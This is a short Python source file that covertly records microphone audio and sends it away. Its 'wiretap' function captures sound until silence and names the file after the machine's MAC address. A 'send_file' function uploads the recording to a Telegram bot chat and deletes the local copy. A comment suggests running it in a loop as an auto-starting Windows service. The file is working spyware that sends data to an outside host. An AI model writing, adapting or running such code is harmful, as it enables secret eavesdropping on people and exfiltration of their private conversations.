import pyaudio, wave, audioop, time, os, requests, uuid, socket
from datetime import datetime
from tg_output_bot import bot, TOKEN, CHAT_ID

mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
current_date = str(datetime.now().replace(microsecond=0))

stream_in = None
audio = None
wf = None
output_file = f"audio_{mac_address.replace(':','')}_{current_date.replace(':', '-')}.wav"

def wiretap():
    global stream_in, audio, wf, output_file

    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    THRESHOLD = 750
    SILENCE_TIMEOUT = 5

    audio = pyaudio.PyAudio()

    stream_in = audio.open(format=FORMAT, channels=CHANNELS,
                           rate=RATE, input=True,
                           frames_per_buffer=CHUNK)

    wf = wave.open(output_file, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)

    is_recording = False
    silence_start_time = None

    try:
        while True:
            data = stream_in.read(CHUNK)
            wf.writeframes(data)

            rms = audioop.rms(data, 2)

            if rms > THRESHOLD:
                if not is_recording:
                    is_recording = True
                    silence_start_time = None
            else:
                if is_recording:
                    if silence_start_time is None:
                        silence_start_time = time.time()
                    elif rms > 500: # new, check
                        silence_start_time = None
                    elif time.time() - silence_start_time > SILENCE_TIMEOUT:
                        break
    except KeyboardInterrupt:
        wiretap()
    finally:
        stream_in.stop_stream()
        stream_in.close()
        audio.terminate()
        wf.close()

def send_file():
    if output_file:
        with open(output_file, 'rb') as file:
            file_url = 'https://api.telegram.org/bot{}/sendAudio'.format(TOKEN)
            files = {'audio': file}
            data = {'chat_id': CHAT_ID}
            response = requests.post(file_url, data=data, files=files)
        os.remove(output_file)

wiretap()
send_file()

'''while True: # to make it not close after sending. not needed if you'll make this program an auto-running Win service
    wiretap()
    send_file()'''
